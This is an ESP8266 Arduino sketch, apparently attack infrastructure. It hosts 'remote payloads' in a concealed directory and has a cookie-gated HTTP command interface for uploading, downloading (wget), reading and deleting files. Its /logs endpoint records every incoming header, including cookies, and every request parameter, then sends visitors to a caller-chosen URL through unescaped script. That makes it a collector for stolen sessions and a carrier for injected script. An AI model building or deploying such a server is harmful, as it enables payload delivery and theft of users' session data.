//----------------------------------------------------------//
//项目名称：remote_payloads_cli
//程序名称：remote_payloads_cli.ino
//作者：wangqinghua
//日期：2021年6月7日
//----------------------------------------------------------//


#include <ESP8266WiFi.h>
#include <ESP8266WiFiMulti.h>
#include <ESP8266WebServer.h>
#include <WiFiClient.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecureBearSSL.h>
#include <FS.h>
#include <Hash.h>

//-----config-start-----//
//#define DEBUG; 
String username = "wangqinghua"; 
String password = "4dcc4173d80a2817206e196a38f0dbf7850188ff"; // sha1 of password "hacker"
String hidenDir = "wangqinghua/"; //url including hidenDir is forbidden to browser but accessible to CLI
//-----config-end-----//
ESP8266WiFiMulti wifier; // 建立ESP8266WiFiMulti对象,对象名称是 'wifier'
ESP8266WebServer shell(80); // 建立cli服务器对象shell，该对象用于响应cli请求。监听端口（80）
String cookieNow = ""; 
String cookieThen = ""; 
File fsUploadFile; 
WiFiClient wifiClient; 
HTTPClient httpClient; 
std::unique_ptr<BearSSL::WiFiClientSecure>wifiClientSSL(new BearSSL::WiFiClientSecure);
HTTPClient httpsClient; 
const char *fingerprint; 
//设置需要收集的请求头信息
const char* headerKeys[] = {"cookie", "User-Agent"}; 

void setup() {
  //打开串口
  #ifdef DEBUG
  Serial.begin(9600);
  #endif
  //联网
  wifier.addAP("ssid_1", "pass_1");
  wifier.addAP("ssid_2", "pass_2");
  #ifdef DEBUG
  Serial.print("Connecting to ");
  #endif
  while (wifier.run() != WL_CONNECTED) {
    delay(1000);
    #ifdef DEBUG
    Serial.print('.');
    #endif
  }
  #ifdef DEBUG
  Serial.print(WiFi.SSID());
  Serial.print(" successfully!\nIP:\t");
  Serial.println(WiFi.localIP());
  #endif
  //启动文件系统
  bool _ = SPIFFS.begin();
  #ifdef DEBUG
  if (_) {
    Serial.println("open FS successfully!");
  } else {
    Serial.println("can't access to FS!");
  }
  #endif
  //启动shell
  shell.on("/cookie", handleCookie); 
  shell.on("/up", HTTP_POST, respondOK, handleFileUpload); 
  shell.on("/logs", handleLogs); 
  shell.on("/list", handleList); 
  shell.on("/cmd", handleCmd); 
  shell.onNotFound(handler); 
  shell.collectHeaders(headerKeys, sizeof(headerKeys) / sizeof(headerKeys[0]));
  shell.begin();
  #ifdef DEBGU
  Serial.println("stand by!");
  #endif
}

void loop() {
  shell.handleClient();
}

//--------------------cmd-start--------------------//
bool handleCookie() {
  // checkCookie
  if (shell.hasArg("cookie")) {
    // oldCookie
    if (shell.arg("cookie") == cookieNow) {
      shell.send(200); 
      return true; 
    }
    // newCookie
    else if (shell.arg("cookie") == cookieThen) {
      if (shell.arg("authen") == sha1(password + cookieThen)) {
        cookieNow = cookieThen; 
        #ifdef DEBUG
        Serial.println("cookieNow=" + cookieNow); 
        #endif
        shell.send(200); 
        return true; 
      }
    }
    // invalidCookie
    else {
      shell.send(403, "text/plain", "Invalid cookie!"); 
      return false; 
    }
  }
  // getCookie
  if (shell.arg("username") != username) {
    shell.send(403, "text/plain", "Invalid username!"); 
    return false; 
  }
  int time_ = time(NULL); 
  int rand_ = rand(); 
  cookieThen = sha1(username + time_ + rand_); 
  shell.send(200, "text/plain", cookieThen); 
  return true; 
}

void respondOK() {
  shell.send(200); 
}

bool handleFileUpload() {
  if (!cookieNow) {
    shell.send(403, "text/plain", "no cookie!"); return false; 
  }
  String cookie = shell.header("cookie"); 
  if (cookie != cookieNow) {
    shell.send(403, "text/plain", "wrong cookie!"); return false; 
  }
  String filePath = shell.arg("filePath"); 
  HTTPUpload& upload = shell.upload(); 
  if(upload.status == UPLOAD_FILE_START){                     // 如果上传状态为UPLOAD_FILE_START
    if(!filePath.startsWith("/")) filePath = "/" + filePath;  // 为上传文件名前加上"/"
    fsUploadFile = SPIFFS.open(filePath, "w");            // 在SPIFFS中建立文件用于写入用户上传的文件数据
  }
  else if(upload.status == UPLOAD_FILE_WRITE){          // 如果上传状态为UPLOAD_FILE_WRITE      
    if(fsUploadFile)
      fsUploadFile.write(upload.buf, upload.currentSize); // 向SPIFFS文件写入浏览器发来的文件数据
  }
  else if(upload.status == UPLOAD_FILE_END){            // 如果上传状态为UPLOAD_FILE_END 
    if(fsUploadFile) {                                    // 如果文件成功建立
      fsUploadFile.close();                               // 将文件关闭
      shell.send(200, "text/plain", "upload successfully!"); 
    } else {                                              // 如果文件未能成功建立
      shell.send(200, "text/plain", "fail to upload!"); // 向浏览器发送相应代码500（服务器错误）
    }    
  }
}

void handleLogs() {
  String toUrl = shell.arg("toUrl"); 
  String logs = "--------------------\n"; 
  for (int i = 0; i < shell.headers(); i++) {
    logs += shell.headerName(i) + ": " + shell.header(i) + "\n"; 
  }
  logs += "-----\n"; 
  for (int i = 0; i < shell.args(); i++) {
    logs += shell.argName(i) + ": " + shell.arg(i) + "\n"; 
  }
  logs += "\n"; 
  File logFile = SPIFFS.open("/payloads/logs", "a"); 
  logFile.println(logs); 
  logFile.close(); 
  if (toUrl) {
    shell.send(200, "text/html", "<script>window.location.replace(\"" + toUrl + "\")</script>"); 
  } else {
    shell.send(200); 
  }
}

void handleList() {
  Dir dir = SPIFFS.openDir("/"); 
  String dirList = "<html><head><meta charset=\"UTF-8\"><title>remote payloads</title></head>";
  dirList += "<body><center><h1>ESP8266 SPIFFS Remote Payloads</h1><hr/>"; 
  while (dir.next()) {
    if (dir.fileName().indexOf(hidenDir) < 0) {
      dirList += "<a href=\"" + dir.fileName() + "\">" + dir.fileName() + "</a><br/>"; 
    }
  }
  dirList += "</center></body></html>"; 
  shell.send(200, "text/html", dirList); 
}

bool handleCmd() {
  if (!cookieNow) {
    shell.send(403, "text/plain", "no cookie!"); 
    return false; 
  }
  if (shell.header("cookie") != cookieNow) {
    shell.send(403, "text/plain", "wrong cookie!"); 
    return false; 
  }
  String cmd = shell.arg("cmd"); 
  if (cmd == "ls") {
    String dir = shell.arg("dir");
    _ls(dir); 
  } else if (cmd == "cat") {
    String filePath = shell.arg("filePath"); 
    _cat(filePath); 
  } else if (cmd == "rm") {
    String filePath = shell.arg("filePath"); 
    _rm(filePath); 
  } else if (cmd == "mv") {
    String oFilePath = shell.arg("oFilePath"); 
    String dFilePath = shell.arg("dFilePath"); 
    _mv(oFilePath, dFilePath); 
  } else if (cmd == "wget") {
    String httpUrl = shell.arg("httpUrl"); 
    String filePath = shell.arg("filePath"); 
    String user_fingerprint = shell.arg("fingerprint"); 
    _wget(httpUrl, filePath, user_fingerprint); 
  } else if (cmd == "exit") {
    cookieNow = ""; 
    shell.send(200, "text/html", "bye!"); 
  } else {
    shell.send(500, "text/html", "Invalid Command!"); 
    return false; 
  }
  return true; 
}

void _ls(String dir) {
  Dir dir_ = SPIFFS.openDir(dir); 
  String dirList = "";
  while (dir_.next()) {
    dirList += dir_.fileName() + "\n"; 
  }
  shell.send(200, "text/plain", dirList.substring(0, dirList.length() - 1)); 
}

void _cat(String filePath) {
  File dataFile = SPIFFS.open(filePath, "r");
  String data = "";
  for (int i = 0; i < dataFile.size(); i++) {
    data += (char)dataFile.read();
  }
  dataFile.close();
  shell.send(200, "text/plain", data); 
}

void _rm(String filePath) {
  if (filePath.endsWith("/")) {
    Dir dir_ = SPIFFS.openDir(filePath); 
    while (dir_.next()) {
      SPIFFS.remove(dir_.fileName()); 
    }
  } else SPIFFS.remove(filePath);
  shell.send(200); 
}

void mvFile(String oFilePath, String dFilePath) {
  File oDataFile = SPIFFS.open(oFilePath, "r"); 
  File dDataFile = SPIFFS.open(dFilePath, "w"); 
  for (int i = 0; i < oDataFile.size(); i++) {
    dDataFile.print((char)oDataFile.read()); 
  }
  oDataFile.close(); 
  dDataFile.close(); 
  SPIFFS.remove(oFilePath); 
}

bool _mv(String oFilePath, String dFilePath) {
  if (oFilePath.endsWith("/") && dFilePath.endsWith("/")) {
    Dir dir = SPIFFS.openDir(oFilePath); 
    while (dir.next()) {
      String dFile = dir.fileName(); 
      dFile.replace(oFilePath, dFilePath); 
      mvFile(dir.fileName(), dFile); 
    }
  } else if (!oFilePath.endsWith("/") && !dFilePath.endsWith("/")) {
    mvFile(oFilePath, dFilePath); 
  } else {
    shell.send(500, "text/plain", "Invalid Command!"); 
    return false; 
  }
  shell.send(200); 
  return true; 
}

bool _wget(String httpUrl, String filePath, String user_fingerprint) {
  if (httpUrl.startsWith("http://")) {
    httpClient.begin(wifiClient, httpUrl); 
    int httpCode = httpClient.GET(); 
    String result; 
    File dataFile = SPIFFS.open(filePath, "w"); 
    if (httpCode > 0) {
      result += "HTTP/1.1 " + httpCode; 
      result += "\n"; 
      if (httpCode == HTTP_CODE_OK) {
        dataFile.print(httpClient.getString()); 
        dataFile.close(); 
      }
      httpClient.end(); 
    } else {
      shell.send(200, "text/plain", httpClient.errorToString(httpCode).c_str()); 
      httpClient.end(); 
      return false; 
    }
    shell.send(200, "text/plain", result); 
    return true; 
  }
  else if (httpUrl.startsWith("https://")) {
    fingerprint = user_fingerprint.c_str(); 
    wifiClientSSL->setFingerprint(fingerprint); 
    httpsClient.begin(*wifiClientSSL, httpUrl); 
    int httpsCode = httpsClient.GET(); 
    String result; 
    File dataFile = SPIFFS.open(filePath, "w"); 
    if (httpsCode > 0) {
      result += "HTTP/1.1 " + httpsCode; 
      result += "\n"; 
      if (httpsCode == HTTP_CODE_OK || httpsCode == HTTP_CODE_MOVED_PERMANENTLY) {
        dataFile.print(httpsClient.getString()); 
        dataFile.close(); 
      }
      httpsClient.end(); 
    } else {
      shell.send(200, "text/plain", httpsClient.errorToString(httpsCode).c_str()); 
      httpsClient.end(); 
      return false; 
    }
    shell.send(200, "text/plain", result); 
    return true; 
  }
  else {
    shell.send(500, "text/plain", "Invalid Command!"); 
    return false; 
  }
}
//--------------------cli-end--------------------//

// 处理用户浏览器的HTTP访问
bool handler() {
  // 获取用户请求网址信息
  String webAddress = shell.uri();
  // 过滤".."
  if (webAddress.indexOf("..") > 0) {
    shell.send(500, "text/plain", "Bad Request!"); 
    return false; 
  } 
  // 黑名单认证
  if (webAddress.indexOf(hidenDir) > 0) {
    if (!cookieNow) {
      shell.send(403, "text/plain", "no cookie!"); 
      return false; 
    }
    if (shell.header("cookie") != cookieNow) {
      shell.send(403, "text/plain", "wrong cookie!"); 
      return false; 
    }
  }
  #ifdef DEBUG
  Serial.print('webAddress= ');
  Serial.println(webAddress);
  #endif
  // 通过handleFileRead函数处处理用户访问
  bool fileReadOK = handleFileRead(webAddress);
  // 如果在SPIFFS无法找到用户访问的资源，则回复404 (Not Found)
  if (!fileReadOK){                                                 
    shell.send(404); 
  }
  return true; 
}

bool handleFileRead(String path) {
  String contentType = getContentType(path);  // 获取文件类型
  if (SPIFFS.exists(path)) {                     // 如果访问的文件可以在SPIFFS中找到
    File file = SPIFFS.open(path, "r");          // 则尝试打开该文件
    shell.streamFile(file, contentType);// 并且将该文件返回给浏览器
    file.close();                                // 并且关闭文件
    return true;                                 // 返回true
  }
  return false;                                  // 如果文件未找到，则返回false
}

// 获取文件类型
String getContentType(String filename){
  if(filename.endsWith(".htm")) return "text/html";
  else if(filename.endsWith(".html")) return "text/html";
  else if(filename.endsWith(".css")) return "text/css";
  else if(filename.endsWith(".js")) return "application/javascript";
  else if(filename.endsWith(".png")) return "image/png";
  else if(filename.endsWith(".gif")) return "image/gif";
  else if(filename.endsWith(".jpg")) return "image/jpeg";
  else if(filename.endsWith(".ico")) return "image/x-icon";
  else if(filename.endsWith(".xml")) return "text/xml";
  else if(filename.endsWith(".pdf")) return "application/x-pdf";
  else if(filename.endsWith(".zip")) return "application/x-zip";
  else if(filename.endsWith(".gz")) return "application/x-gzip";
  else if(filename.endsWith(".asp")) return "text/asp";
  else if(filename.endsWith(".jsp")) return "text/jsp";
  else if(filename.endsWith(".asp")) return "text/asp";
  return "text/plain";
}
